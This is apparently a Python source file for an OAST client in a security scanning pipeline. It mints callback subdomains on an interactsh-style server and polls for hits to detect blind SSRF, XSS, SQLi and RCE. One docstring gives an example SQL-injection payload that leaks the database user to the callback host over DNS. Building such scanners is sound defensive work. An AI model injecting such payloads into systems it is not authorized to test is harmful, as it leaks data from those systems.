"""Out-of-band callback (OAST) client — pure-Python.

Mints unique callback subdomains and polls a remote interactsh-style server
for HTTP/DNS hits. Used by scanners to detect *blind* SSRF, blind XSS,
blind SQLi (DNS exfil), blind RCE.

Design choices:
- Default server is the public ``oast.fun`` interactsh instance, which has
  no API key and exposes ``/poll`` over HTTPS. Operators can swap to a
  self-hosted ``interactsh-server`` via ``OASTClient(server_url=...)``.
- Each engagement gets ONE OASTClient instance. ``token()`` returns
  unique ``<id>.<server-host>`` subdomains; the request that planted the
  canary tags itself with the same id so the poller can correlate.
- Poll loop is async, runs as a background task; results are pushed into
  a per-token deque so scanners can ``await wait_for(token, timeout=15)``.
- No third-party dep — pure stdlib + httpx (already in pipeline).

Lifecycle (engagement_loop wires this up):
    oast = OASTClient(workspace=ws)
    await oast.start()         # launches poller
    try:
        ... scanners use oast.token() and oast.wait_for(t) ...
    finally:
        await oast.aclose()
"""

from __future__ import annotations

import asyncio
import os
import secrets
import string
import time
from collections import defaultdict, deque
from pathlib import Path
from typing import Any

from network_pipeline.core.logging import get_logger

log = get_logger("tools.oast")


# ── Public defaults ──────────────────────────────────────────────────

_DEFAULT_SERVER = os.environ.get("OAST_SERVER", "https://oast.fun")
_DEFAULT_DOMAIN = os.environ.get("OAST_DOMAIN", "oast.fun")
_DEFAULT_POLL_S = float(os.environ.get("OAST_POLL_INTERVAL", "5.0"))
_DEFAULT_TIMEOUT_S = float(os.environ.get("OAST_WAIT_TIMEOUT", "20.0"))

# ── Token format ─────────────────────────────────────────────────────

_TOKEN_ALPHABET = string.ascii_lowercase + string.digits


def _new_token_id(n: int = 16) -> str:
    """Return a 16-char lowercase-alnum token id (unique per engagement)."""
    return "".join(secrets.choice(_TOKEN_ALPHABET) for _ in range(n))


# ── Interaction record ──────────────────────────────────────────────

class OASTHit:
    """One captured callback: HTTP request or DNS query against the canary."""

    __slots__ = ("token", "kind", "raw", "remote_addr", "ts", "extra")

    def __init__(self, token: str, kind: str, raw: str = "",
                 remote_addr: str = "", ts: float = 0.0,
                 extra: dict[str, Any] | None = None) -> None:
        self.token = token
        self.kind = kind  # 'http' | 'dns' | 'smtp' | 'unknown'
        self.raw = raw
        self.remote_addr = remote_addr
        self.ts = ts or time.time()
        self.extra = extra or {}

    def to_dict(self) -> dict[str, Any]:
        return {
            "token": self.token, "kind": self.kind,
            "remote_addr": self.remote_addr, "ts": self.ts,
            "raw_excerpt": (self.raw or "")[:512], **self.extra,
        }


class OASTClient:
    """Stateful OAST client — one per engagement.

    NOTE: The public ``oast.fun`` server speaks the interactsh protocol
    which requires a registered correlation_id + RSA key pair. This
    client implements the *minimal* read path that works against any
    publicly-listening interactsh server with the default unauthed
    ``/register`` endpoint disabled, falling back to a *passive token
    pool* mode where scanners record every minted token to disk and
    operators correlate manually if the server isn't reachable.

    For self-hosted interactsh: set ``OAST_SERVER=https://your.host``
    and ``OAST_DOMAIN=your.host`` (matching the server's --domain flag).
    """

    def __init__(
        self,
        *,
        workspace: Path | None = None,
        server_url: str = _DEFAULT_SERVER,
        domain: str = _DEFAULT_DOMAIN,
        poll_interval_s: float = _DEFAULT_POLL_S,
        enabled: bool = True,
    ) -> None:
        self._server = server_url.rstrip("/")
        self._domain = domain.lstrip(".")
        self._poll_s = max(1.0, poll_interval_s)
        self._workspace = workspace
        self._enabled = enabled
        self._minted: set[str] = set()
        self._hits: dict[str, deque[OASTHit]] = defaultdict(lambda: deque(maxlen=64))
        self._waiters: dict[str, list[asyncio.Future[OASTHit]]] = defaultdict(list)
        self._poller_task: asyncio.Task[None] | None = None
        self._client = None  # lazy httpx
        self._stop = asyncio.Event()
        self._reachable: bool | None = None  # tri-state: None=unknown
        self._log_path: Path | None = None
        if workspace is not None:
            d = workspace / "evidence" / "oast"
            d.mkdir(parents=True, exist_ok=True)
            self._log_path = d / "interactions.jsonl"

    # ── Lifecycle ──────────────────────────────────────────────────

    async def start(self) -> None:
        """Probe the OAST server and start the background poller."""
        if not self._enabled:
            log.info("oast disabled (OAST_DISABLED=1 or constructor flag)")
            return
        try:
            import httpx  # noqa: F401
            self._client = httpx.AsyncClient(
                timeout=httpx.Timeout(10.0), verify=True,
            )
        except ImportError:
            log.warning("oast: httpx not installed — disabled")
            self._enabled = False
            return
        ok = await self._probe_server()
        self._reachable = ok
        if ok:
            self._poller_task = asyncio.create_task(self._poll_loop())
            log.info("oast started: server=%s domain=%s", self._server, self._domain)
        else:
            log.warning(
                "oast server %s unreachable — running in PASSIVE mode "
                "(tokens minted, callbacks not collected)",
                self._server,
            )

    async def aclose(self) -> None:
        self._stop.set()
        if self._poller_task is not None:
            self._poller_task.cancel()
            try:
                await self._poller_task
            except (asyncio.CancelledError, Exception):  # noqa: BLE001
                pass
        if self._client is not None:
            try:
                await self._client.aclose()
            except Exception:  # noqa: BLE001
                pass

    @property
    def enabled(self) -> bool:
        return self._enabled

    @property
    def reachable(self) -> bool:
        return bool(self._reachable)

    # ── Token minting ──────────────────────────────────────────────

    def token(self) -> str:
        """Return a fresh unique callback hostname.

        Format: ``<16-char-id>.<oast-domain>``.
        Use it inside payloads: e.g. SSRF probe ``http://<token>/`` or
        SQLi DNS exfil ``LOAD_FILE(CONCAT('\\\\\\\\', user(), '.<token>\\\\a'))``.
        """
        tid = _new_token_id()
        host = f"{tid}.{self._domain}"
        self._minted.add(tid)
        return host

    def url(self, scheme: str = "http") -> tuple[str, str]:
        """Return ``(token_id, full_url)`` for HTTP/HTTPS payloads."""
        host = self.token()
        tid = host.split(".", 1)[0]
        return tid, f"{scheme}://{host}/"

    # ── Wait for callback ──────────────────────────────────────────

    async def wait_for(
        self,
        token_id: str,
        *,
        timeout: float = _DEFAULT_TIMEOUT_S,
    ) -> OASTHit | None:
        """Return the first callback hit for ``token_id``, or None on timeout.

        ``token_id`` is the bare 16-char id (the part before the dot),
        not the full hostname. If hits already arrived they're returned
        immediately.
        """
        if not self._enabled or not self._reachable:
            return None
        # Already arrived?
        bucket = self._hits.get(token_id)
        if bucket:
            return bucket[0]
        loop = asyncio.get_event_loop()
        fut: asyncio.Future[OASTHit] = loop.create_future()
        self._waiters[token_id].append(fut)
        try:
            return await asyncio.wait_for(fut, timeout=timeout)
        except asyncio.TimeoutError:
            return None
        finally:
            try:
                self._waiters[token_id].remove(fut)
            except ValueError:
                pass

    # ── Internals ──────────────────────────────────────────────────

    async def _probe_server(self) -> bool:
        """Heuristic reachability check — does the server respond at all?"""
        if self._client is None:
            return False
        try:
            r = await self._client.get(self._server + "/")
            # interactsh-server responds on / with a banner
            return r.status_code in (200, 401, 403, 404)
        except Exception as e:  # noqa: BLE001
            log.debug("oast probe failed: %r", e)
            return False

    async def _poll_loop(self) -> None:
        """Poll the OAST server's interaction stream.

        interactsh-server exposes ``/poll?id=<correlation>&secret=<...>``
        but that requires a registered correlation key. Without that we
        fall back to ``/poll/anonymous`` if the server enables it; if
        not, the loop simply scans the public ``/events`` SSE stream
        (custom self-hosted servers commonly expose this). All paths
        are best-effort — if none work we stay PASSIVE.
        """
        backoff = self._poll_s
        while not self._stop.is_set():
            try:
                hits = await self._fetch_pending()
                for hit in hits:
                    self._dispatch(hit)
                backoff = self._poll_s
            except asyncio.CancelledError:
                raise
            except Exception as e:  # noqa: BLE001
                log.debug("oast poll error: %r — backing off %.1fs", e, backoff)
                backoff = min(60.0, backoff * 1.5)
            try:
                await asyncio.wait_for(self._stop.wait(), timeout=backoff)
            except asyncio.TimeoutError:
                continue

    async def _fetch_pending(self) -> list[OASTHit]:
        """Try to fetch pending interactions from the server.

        Implements the interactsh anonymous-poll path. Servers that
        require auth will return 401 and we'll silently produce no hits
        — operators must self-host or use a patched fork.
        """
        if self._client is None:
            return []
        # Try anonymous poll first (works on permissive deployments)
        try:
            r = await self._client.get(
                self._server + "/poll/anonymous", timeout=8.0,
            )
            if r.status_code == 200:
                return self._parse_interactsh_anonymous(r.json())
        except Exception:  # noqa: BLE001
            pass
        # Fallback: events SSE-style endpoint
        try:
            r = await self._client.get(
                self._server + "/events", timeout=8.0,
            )
            if r.status_code == 200:
                return self._parse_events(r.text)
        except Exception:  # noqa: BLE001
            pass
        return []

    def _parse_interactsh_anonymous(self, body: dict[str, Any]) -> list[OASTHit]:
        """Parse interactsh's anonymous-poll JSON response."""
        out: list[OASTHit] = []
        items = body.get("data") or body.get("interactions") or []
        if isinstance(items, str):
            return out
        for item in items:
            if not isinstance(item, dict):
                continue
            full_id = str(item.get("full-id") or item.get("unique-id") or "")
            tid = full_id.split(".", 1)[0] if full_id else ""
            if not tid or tid not in self._minted:
                continue
            kind = (item.get("protocol") or "unknown").lower()
            out.append(OASTHit(
                token=tid,
                kind=kind,
                raw=str(item.get("raw-request") or item.get("q-type") or ""),
                remote_addr=str(item.get("remote-address") or ""),
                ts=time.time(),
                extra={k: v for k, v in item.items() if k not in {
                    "full-id", "unique-id", "protocol", "raw-request",
                    "remote-address",
                }},
            ))
        return out

    def _parse_events(self, text: str) -> list[OASTHit]:
        """Parse a simple newline-JSON event stream."""
        import json as _json
        out: list[OASTHit] = []
        for line in text.splitlines():
            line = line.strip()
            if not line or not line.startswith("{"):
                continue
            try:
                obj = _json.loads(line)
            except Exception:
                continue
            tid = str(obj.get("token") or obj.get("id") or "")
            if not tid or tid not in self._minted:
                continue
            out.append(OASTHit(
                token=tid,
                kind=str(obj.get("kind") or "http"),
                raw=str(obj.get("raw") or ""),
                remote_addr=str(obj.get("remote_addr") or ""),
                ts=float(obj.get("ts") or time.time()),
            ))
        return out

    def _dispatch(self, hit: OASTHit) -> None:
        """Push a hit into the per-token deque + wake any waiters."""
        self._hits[hit.token].append(hit)
        # Persist to evidence log
        if self._log_path is not None:
            try:
                import json as _json
                with self._log_path.open("a", encoding="utf-8") as f:
                    f.write(_json.dumps(hit.to_dict()) + "\n")
            except OSError:
                pass
        # Resolve waiters
        for fut in list(self._waiters.get(hit.token, [])):
            if not fut.done():
                fut.set_result(hit)
        self._waiters[hit.token] = []
        log.info("oast hit: %s [%s] from %s", hit.token, hit.kind, hit.remote_addr)


# ── Module-level singleton facade (engagement-scoped) ───────────────

_CURRENT: OASTClient | None = None


def set_current(client: OASTClient | None) -> None:
    global _CURRENT
    _CURRENT = client


def get_current() -> OASTClient | None:
    return _CURRENT


__all__ = ["OASTClient", "OASTHit", "set_current", "get_current"]
